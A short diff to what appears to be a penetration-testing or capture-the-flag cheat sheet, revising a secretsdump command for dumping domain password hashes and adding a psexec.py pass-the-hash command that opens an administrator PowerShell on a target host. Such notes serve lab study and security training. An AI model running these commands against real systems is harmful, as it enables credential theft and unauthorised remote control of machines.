@@ -183,7 +183,9 @@ Now I need to authorize the connection, I need to browse the http://localhost/pr
 
 Secretsdump can be utilized to get hashes of more privileged users:
 ```bash
-secretsdump htb/[USER]:[PASSWORD]@10.10.10.161
+secretsdump [DOMAIN]/[USER]:[PASSWORD]@10.10.10.161
+# And if we have luck, we can use the hash with *psexec*, or try to crack it.
+./psexec.py -hashes :[HASH] [DOMAIN]/administrator@[RHOST] powershell.exe
 ```
 
 # WebApplication Hacking
